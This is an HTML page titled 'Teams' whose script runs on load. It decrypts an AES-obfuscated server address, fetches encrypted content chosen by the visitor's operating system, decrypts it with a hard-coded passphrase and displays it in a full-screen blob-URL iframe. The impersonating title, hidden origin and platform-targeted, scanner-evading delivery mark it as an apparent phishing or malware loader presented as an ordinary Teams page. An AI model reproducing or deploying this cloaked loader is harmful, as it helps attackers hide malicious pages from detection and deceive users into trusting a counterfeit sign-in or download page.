<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Teams</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
  <style>
    html, body { margin: 0; height: 100%; overflow: hidden; background: #fff; }
    #frame { 
      width: 100%; 
      height: 100vh; 
      border: 0; 
      display: block; 
    }
    /* Loading indicator */
    #loading {
      position: fixed;
      inset: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #fff;
      z-index: 10000;
      flex-direction: column;
      font-family: Arial, sans-serif;
    }
    .spinner {
      width: 50px;
      height: 50px;
      border: 3px solid #f3f3f3;
      border-top: 3px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #loading p {
      margin-top: 20px;
      color: #666;
    }
  </style>

  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-0LY0HY7L01');
  </script>
</head>
<body>

  <!-- Loading indicator -->
  <div id="loading">
    <div class="spinner"></div>
    <p>Loading...</p>
  </div>

  <!-- FIXED: Removed src attribute completely -->
  <iframe id="frame" 
          title="encrypted shop" 
          allowfullscreen 
          allow="fullscreen"
          style="width: 100%; height: 100vh; border: 0; display: none;">
  </iframe>

  <script>
    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
    const URL_KEY = "UrLk3yShopEase01";
    const ENC_DATA_ORIGIN = "U2FsdGVkX19JzfJcbkpx0lIuONyvMQ9gjcZSw7Bx/Bs36JWstdXSf0v9oWVxZd0x8lBsfAIDzu549PjWPlHakQ==";
    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
    const DATA_URL = DATA_ORIGIN + "/data";
    let lastUrl = null;

    function detectPlatform() {
      try {
        const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
                  navigator.platform || navigator.userAgent || "";
        return /mac/i.test(p) ? "mac" : "win";
      } catch(e) {
        return "win";
      }
    }

    async function loadSecret() {
      const frame = document.getElementById("frame");
      const loading = document.getElementById("loading");
      
      try {
        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
        
        if (!res.ok) {
          throw new Error(`HTTP ${res.status}`);
        }
        
        const { cipher } = await res.json();
        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
        
        if (!html) throw new Error("Decrypt failed — wrong key?");

        if (lastUrl) URL.revokeObjectURL(lastUrl);
        const blob = new Blob([html], { type: "text/html; charset=utf-8" });
        lastUrl = URL.createObjectURL(blob);

        // Show iframe and hide loading
        frame.style.display = "block";
        loading.style.display = "none";
        
        // Set blob URL - yahan sirf blob: URL aayega
        frame.src = lastUrl;
        
        console.log("✅ Content loaded with blob URL:", lastUrl);
        
      } catch (e) {
        console.error("❌ Failed to load or decrypt the content: ", e.message);
        loading.innerHTML = `
          <div style="text-align: center; color: #e74c3c;">
            <p style="font-size: 18px;">❌ Failed to load content</p>
            <p style="font-size: 14px; color: #888;">${e.message}</p>
            <button onclick="location.reload()" style="padding: 10px 30px; margin-top: 20px; cursor: pointer; background: #3498db; color: white; border: none; border-radius: 5px; font-size: 16px;">Refresh</button>
          </div>
        `;
      }
    }

    window.addEventListener("DOMContentLoaded", loadSecret);
  </script>
</body>
</html>
